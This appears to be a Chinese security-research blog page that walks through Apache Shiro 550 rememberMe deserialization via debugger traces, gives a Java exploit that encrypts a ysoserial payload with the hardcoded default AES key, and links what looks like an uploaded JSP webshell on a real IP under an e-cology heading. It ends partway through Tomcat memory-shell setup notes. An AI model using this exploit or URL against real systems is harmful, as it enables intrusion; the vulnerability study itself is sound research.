<p><img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231121233908447.png" alt="image-20231121233908447"></p>
<p>可以看到在这里获取了三个登陆参数的值，然后带入<code>UsernamePasswordToken</code>类进行处理，跟进看一下这个类做了什么</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231121235615547.png" alt="image-20231121235615547" style="zoom:80%;" />

<p>从文档了解到这个类是封装了提交的用户名密码以及<code>rememberMe</code>是否勾选，继续跟进</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122000608042.png" alt="image-20231122000608042" style="zoom:80%;" />

<p>这里设置好了四个字段，回到<code>UserController</code>类</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122002002045.png" alt="image-20231122002002045" style="zoom:80%;" />

<p>可以看到把<code>UsernamePasswordToken</code>对象传入了<code>subject</code>的<code>login</code>方法，这里的<code>subject</code>对象实际上获取到的是<code>WebDelegatingSubject</code>对象</p>
<p><img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122002554451.png" alt="image-20231122002554451"></p>
<p>而<code>WebDelegatingSubject</code>对象是<code>DelegatingSubject</code>的子类，跟进到<code>DelegatingSubject</code>的<code>login</code>方法</p>
<p><img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122002857818.png" alt="image-20231122002857818"></p>
<p>这里又调用了<code>securityManager</code>的<code>login</code>方法来对token进行校验，即<code>DefaultSecurityManager</code>的login方法，判断是否有这个用户</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122004435359.png" alt="image-20231122004435359" style="zoom:80%;" />

<p>login方法通过抽象类<code>AuthenticatingSecurityManager</code>的<code>authenticate</code>方法进行验证</p>
<p><img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122005026803.png" alt="image-20231122005026803"></p>
<p>这里包装的<code>authenticator</code>是<code>ModularRealmAuthenticator</code>，跟进</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122005320985.png" alt="image-20231122005320985" style="zoom:80%;" />

<p>继承自<code>AbstractAuthenticator</code>，跟进到<code>authenticate</code>方法，中间又调用了<code>doAuthenticate</code>方法</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122010014736.png" alt="image-20231122010014736" style="zoom:80%;" />

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122010248488.png" alt="image-20231122010248488" style="zoom:80%;" />

<p>跟进到<code>doAuthenticate</code>方法，这个方法是通过迭代Realm的内部集合来验证token，如果realm有多个，会多个迭代验证，如果realm只有一个，则直接调用<code>doSingleRealmAuthentication</code></p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122010612502.png" alt="image-20231122010612502" style="zoom:80%;" />

<p>可以看到我们只有一个<code>MainRealm</code>，那么直接跟进到<code>MainRealm</code>的<code>Authenticator</code></p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122010813998.png" alt="image-20231122010813998" style="zoom:80%;" />

<p>验证账号密码，通过则返回一个<code>SimpleAuthenticationInfo</code>，失败则抛出报错，最后将登录验证后的信息全部return，回到<code>UserController</code></p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122012927052.png" alt="image-20231122012927052" style="zoom:80%;" />

<p>至此整个普通登录流程分析完毕</p>
<h5 id="勾选rememberMe登录，产生rememberMe"><a href="#勾选rememberMe登录，产生rememberMe" class="headerlink" title="勾选rememberMe登录，产生rememberMe"></a>勾选rememberMe登录，产生rememberMe</h5><p>shiro550的主要漏洞点是rememberMe参数，我们来看看勾选了rememberMe后的登录流程</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122011201472.png" alt="image-20231122011201472" style="zoom:80%;" />

<p>其他步骤和普通登录一样，我们直接跟到<code>UsernamePasswordToken</code></p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122011323210.png" alt="image-20231122011323210" style="zoom:80%;" />

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122011435067.png" alt="image-20231122011435067" style="zoom:80%;" />

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122011445204.png" alt="image-20231122011445204" style="zoom:80%;" />

<p>回到<code>UserController</code>，跟进<code>DelegatingSubject</code>的login方法</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122011634356.png" alt="image-20231122011634356" style="zoom:80%;" />

<p>跟进到<code>DefaultSecurityManager</code>的login方法，完成了验证之后会调用<code>onSuccessfulLogin</code>方法</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122012303077.png" alt="image-20231122012303077" style="zoom:80%;" />

<p>跟进到<code>onSuccessfulLogin</code>方法</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122013136299.png" alt="image-20231122013136299" style="zoom:80%;" />

<p>调用了<code>rememberMeSuccessfulLogin</code>方法，继续跟进</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122013235520.png" alt="image-20231122013235520" style="zoom:80%;" />

<p>此时rmm通过<code>getRememberMeManager</code>方法获取到了一个<code>RememberMeManager</code>对象</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122013432211.png" alt="image-20231122013432211" style="zoom:80%;" />

<p>我们来看看<code>RememberMeManager</code>对象是怎么来的</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122013652575.png" alt="image-20231122013652575" style="zoom:80%;" />

<p>跟进<code>RememberMeManager</code>，一共有两处实现了这个接口</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122013837658.png" alt="image-20231122013837658" style="zoom:80%;" />

<p>回到<code>ShiroConfig</code>类，我们可以看到这里是通过<code>cookieRememberMeManager</code>作为RememberMeManager</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122014105448.png" alt="image-20231122014105448" style="zoom:80%;" />

<p>直接跟进到<code>cookieRememberMeManager</code>类</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122014759058.png" alt="image-20231122014759058" style="zoom:80%;" />

<p>跟进到父类<code>AbstractRememberMeManager</code></p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122015134647.png" alt="image-20231122015134647" style="zoom:80%;" />

<p>这里是base64编码后的硬编码key</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122015319506.png" alt="image-20231122015319506" style="zoom:80%;" />

<p>实例化时设置了默认的序列化器、设置加密服务为AES以及密钥，参数如下</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122015503145.png" alt="image-20231122015503145" style="zoom:80%;" />

<p>此时我们获取到了一个完整的<code>cookieRememberMeManager</code></p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122015939611.png" alt="image-20231122015939611" style="zoom:80%;" />

<p>回到<code>rememberMeSuccessfulLogin</code>方法</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122020911756.png" alt="image-20231122020911756" style="zoom:80%;" />

<p>调用了rmm的<code>onSuccessfulLogin</code>方法</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122021025908.png" alt="image-20231122021025908" style="zoom:80%;" />

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122095638165.png" alt="image-20231122095638165" style="zoom:80%;" />

<p>删除身份数据后，通过<code>isRememberMe</code>来判断是否启用了rememberMe</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122100024273.png" alt="image-20231122100024273" style="zoom:80%;" />

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122100642219.png" alt="image-20231122100642219" style="zoom:80%;" />

<p>如果为true则进入<code>rememberIdentity</code>流程，先从authcInfo获取了账号主体，这一步是通过LinkedHashMap来追踪账号主体</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122102100281.png" alt="image-20231122102100281" style="zoom:80%;" />

<p>接着带着subject和主体进入下一个重载方法</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122101454796.png" alt="image-20231122101454796" style="zoom:80%;" />

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122101743245.png" alt="image-20231122101743245" style="zoom:80%;" />

<p>将帐户主体converting成字节数组的这一步就是我们的重点，直接跟进</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122102710239.png" alt="image-20231122102710239" style="zoom:80%;" />

<p>通过文档了解到这一步是为了把主体集合转换成“记住登录”的数组，首先通过serialize将主体序列化为字节数组</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122103037285.png" alt="image-20231122103037285" style="zoom:80%;" />

<p>接着调用<code>getCipherService</code>获取加密服务对字节数组进行加密，也就是之前提到的AES加密流程</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122103142931.png" alt="image-20231122103142931" style="zoom:80%;" />

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122103304955.png" alt="image-20231122103304955" style="zoom:80%;" />

<p>接着返回加密后的字节数组，回到<code>rememberIdentity</code>方法，进入最后一步<code>rememberSerializedIdentity</code></p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122103534729.png" alt="image-20231122103534729" style="zoom:80%;" />

<p><img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122103629854.png" alt="image-20231122103629854"></p>
<p>在此处实现</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122103711227.png" alt="image-20231122103711227" style="zoom:80%;" />

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122103733649.png" alt="image-20231122103733649" style="zoom:80%;" />

<p>后面的步骤就很好理解了，先对传入的加密后的字节数组进行一次Base64编码，然后获取cookie模板创建一个SimpleCookie对象，接着通过操作SimpleCookie对象，把最终的rememberMe放进HTTP请求中的cookie</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122104323116.png" alt="image-20231122104323116" style="zoom:80%;" />

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122104906827.png" alt="image-20231122104906827" style="zoom:80%;" />

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122105413804.png" alt="image-20231122105413804" style="zoom:80%;" />

<p>至此，整个产生rememberMe的流程分析完毕</p>
<h5 id="rememberMe自动登录"><a href="#rememberMe自动登录" class="headerlink" title="rememberMe自动登录"></a>rememberMe自动登录</h5><p>上面分析了rememberMe产生的过程，接下来我们带着rememberMe直接访问，还是在登录判断处下断点</p>
<p>一路跟进到<code>DefaultSecurityManager</code>的login方法，在验证完token之后会通过<code>createSubject</code>创建登录后的Subject对象</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122112019024.png" alt="image-20231122112019024" style="zoom:80%;" />

<p>我们直接跟进到<code>createSubject</code>方法</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122114444348.png" alt="image-20231122114444348" style="zoom:80%;" />

<p>带着注释简单分析一下过程，首先通过<code>ensureSecurityManager</code>补充上SecurityManager实例，然后通过<code>resolveSession</code>解析Session，接着通过<code>resolvePrincipals</code>方法解析用户主体，最后再用context创建Subject实例</p>
<p>触发点就在解析用户主体的过程中，我们直接跟进</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122115150347.png" alt="image-20231122115150347" style="zoom:80%;" />

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122132612274.png" alt="image-20231122132612274" style="zoom:80%;" />

<p>在这个过程中，先解析了主体，如果主体为空再通过调用<code>getRememberedIdentity</code>检查rememberMe身份，跟进</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122132709198.png" alt="image-20231122132709198" style="zoom:80%;" />

<p>这里首先获取<code>RememberMeManager</code>，如果不为空则调用rmm的<code>getRememberedPrincipals</code>方法，跟进到<code>CookieRememberMeManager</code>的<code>getRememberedPrincipals</code>方法</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122133353077.png" alt="image-20231122133353077" style="zoom:80%;" />

<p>这其中一共有两个重要方法<code>getRememberedSerializedIdentity</code>和<code>convertBytesToPrincipals</code>，我们首先看第一个</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122133523076.png" alt="image-20231122133523076" style="zoom:80%;" />

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122134050624.png" alt="image-20231122134050624" style="zoom:80%;" />

<p>通过<code>getCookie().readValue()</code>获取cookie中rememberMe的值</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122134155403.png" alt="image-20231122134155403" style="zoom:80%;" />

<p>把value返回后在<code>getRememberedSerializedIdentity</code>中进行base64解码，然后转为字节数组并return</p>
<p>回到<code>getRememberedPrincipals</code>，如果返回的字节数组不为空则继续下一步<code>convertBytesToPrincipals</code></p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122134620971.png" alt="image-20231122134620971" style="zoom:80%;" />

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122134758200.png" alt="image-20231122134758200" style="zoom:80%;" />

<p>这里是获取解密服务，步骤和前面一样，通过AES解密字节数组，最后交给<code>deserialize</code>进行反序列化</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122135111765.png" alt="image-20231122135111765" style="zoom:80%;" />

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122135145997.png" alt="image-20231122135145997" style="zoom:80%;" />

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122135238815.png" alt="image-20231122135238815" style="zoom:80%;" />

<p>这就是最终触发反序列化的地方，返回一个账号主体</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122135443143.png" alt="image-20231122135443143" style="zoom:80%;" />

<p>至此，整个rememberMe自动登录的过程分析完毕</p>
<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>经过所有的分析，我们知道了如何通过rememberMe进行反序列化，接下来构造exp利用</p>
<p>首先用ysoserial生成CC1的payload</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122192403843.png" alt="image-20231122192403843" style="zoom:80%;" />

<p>接下来我们来构造EXP</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.shiro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.CipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shiro550_Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//我们直接调用shiro的AES服务来进行加密</span></span><br><span class="line">        <span class="type">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = org.apache.shiro.codec.Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        <span class="type">CipherService</span> <span class="variable">cipherService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//读取payload为字节数组</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;H:\\Java_Project\\Java_Security\\src\\com\\y5neko\\sec\\shiro\\shiro550&quot;</span>));</span><br><span class="line">        <span class="comment">//AES加密</span></span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">byteSource</span> <span class="operator">=</span> cipherService.encrypt(bytes, DEFAULT_CIPHER_KEY_BYTES);</span><br><span class="line">        <span class="type">byte</span>[] value = byteSource.getBytes();</span><br><span class="line">        <span class="comment">//Base64编码</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(value);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122215219157.png" alt="image-20231122215219157" style="zoom:80%;" />

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231122215333208.png" alt="image-20231122215333208" style="zoom:80%;" />

<h3 id="绕过waf执行"><a href="#绕过waf执行" class="headerlink" title="绕过waf执行"></a>绕过waf执行</h3><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/N4wF28mCWprD2edSd91L0Q">https://mp.weixin.qq.com/s/N4wF28mCWprD2edSd91L0Q</a></p>
<h2 id="JBoss"><a href="#JBoss" class="headerlink" title="JBoss"></a>JBoss</h2><h2 id="Struts"><a href="#Struts" class="headerlink" title="Struts"></a>Struts</h2><h2 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h2><h2 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h2><h2 id="ThinkPHP"><a href="#ThinkPHP" class="headerlink" title="ThinkPHP"></a>ThinkPHP</h2><h2 id="Vcenter"><a href="#Vcenter" class="headerlink" title="Vcenter"></a>Vcenter</h2><h2 id="CommonCollections"><a href="#CommonCollections" class="headerlink" title="CommonCollections"></a>CommonCollections</h2><h3 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h3><h2 id="e-cology"><a href="#e-cology" class="headerlink" title="e-cology"></a>e-cology</h2><p><a target="_blank" rel="noopener" href="http://182.150.63.102:7180/formmode/apps/upload/ktree/images/17018768907903b4b9ae1-0e54-48c9-9462-9298a2139706.jsp">http://182.150.63.102:7180/formmode/apps/upload/ktree/images/17018768907903b4b9ae1-0e54-48c9-9462-9298a2139706.jsp</a></p>
<h1 id="内存马相关"><a href="#内存马相关" class="headerlink" title="内存马相关"></a>内存马相关</h1><p>环境：<a target="_blank" rel="noopener" href="https://dlcdn.apache.org/tomcat/tomcat-9/v9.0.89/bin/">https://dlcdn.apache.org/tomcat/tomcat-9/v9.0.89/bin/</a></p>
<h2 id="Servlet容器与Engine、Host、Context和Wrapper"><a href="#Servlet容器与Engine、Host、Context和Wrapper" class="headerlink" title="Servlet容器与Engine、Host、Context和Wrapper"></a>Servlet容器与Engine、Host、Context和Wrapper</h2><p><code>Tomcat</code>设计了四种容器，分别是<code>Engine</code>、<code>Host</code>、<code>Context</code>和<code>Wrapper</code>，其关系如下：</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240618102910365.png" alt="image-20240618102910365" style="zoom:80%;" />

<p>要访问<code>https://manage.xxx.com:8080/user/list</code>，那<code>tomcat</code>是如何实现请求定位到具体的<code>servlet</code>的呢？为此<code>tomcat</code>设计了<code>Mapper</code>，其中保存了容器组件与访问路径的映射关系。</p>
<ul>
<li>根据协议和端口号选定<code>Service</code>和<code>Engine</code>。</li>
</ul>
<p>我们知道<code>Tomcat</code>的每个连接器都监听不同的端口，比如<code>Tomcat</code>默认的<code>HTTP</code>连接器监听<code>8080</code>端口、默认的<code>AJP</code>连接器监听<code>8009</code>端口。上面例子中的URL访问的是<code>8080</code>端口，因此这个请求会被<code>HTTP</code>连接器接收，而一个连接器是属于一个<code>Service</code>组件的，这样<code>Service</code>组件就确定了。我们还知道一个<code>Service</code>组件里除了有多个连接器，还有一个容器组件，具体来说就是一个<code>Engine</code>容器，因此<code>Service</code>确定了也就意味着<code>Engine</code>也确定了。</p>
<ul>
<li>根据域名选定<code>Host</code>。</li>
</ul>
<p><code>Service</code>和<code>Engine</code>确定后，<code>Mapper</code>组件通过<code>url</code>中的域名去查找相应的<code>Host</code>容器，比如例子中的<code>url</code>访问的域名是<code>manage.xxx.com</code>，因此<code>Mapper</code>会找到<code>Host1</code>这个容器。</p>
<ul>
<li>根据<code>url</code>路径找到<code>Context</code>组件。</li>
</ul>
<p><code>Host</code>确定以后，<code>Mapper</code>根据<code>url</code>的路径来匹配相应的<code>Web</code>应用的路径，比如例子中访问的是<code>/user</code>，因此找到了<code>Context1</code>这个<code>Context</code>容器。</p>
<ul>
<li>根据<code>url</code>路径找到<code>Wrapper</code>（<code>Servlet</code>）。</li>
</ul>
<p><code>Context</code>确定后，<code>Mapper</code>再根据<code>web.xml</code>中配置的<code>Servlet</code>映射路径来找到具体的<code>Wrapper</code>和<code>Servlet</code>，例如这里的<code>Wrapper1</code>的<code>/list</code>。</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240618103421280.png" alt="image-20240618103421280" style="zoom:80%;" />

<h2 id="servlet测试"><a href="#servlet测试" class="headerlink" title="servlet测试"></a>servlet测试</h2><p>pom.xml如下</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.y5neko<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>JavaMemshellLearn<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>TestServlet.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>配置tomcat后添加工件-》展开型</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240618104504716.png" alt="image-20240618104504716" style="zoom:80%;" />

<p>然后添加web模块</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240618104631583.png" alt="image-20240618104631583" style="zoom:80%;" />

<p>运行后访问地址：</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240618104705645.png" alt="image-20240618104705645"  />

<h2 id="从代码层面看servlet初始化与装载流程"><a href="#从代码层面看servlet初始化与装载流程" class="headerlink" title="从代码层面看servlet初始化与装载流程"></a>从代码层面看servlet初始化与装载流程</h2><p>使用嵌入式<code>tomcat</code>也就是所谓的<code>tomcat-embed-core</code>搭建环境</p>
<p>pom.xml</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.y5neko<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ServletTest<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span 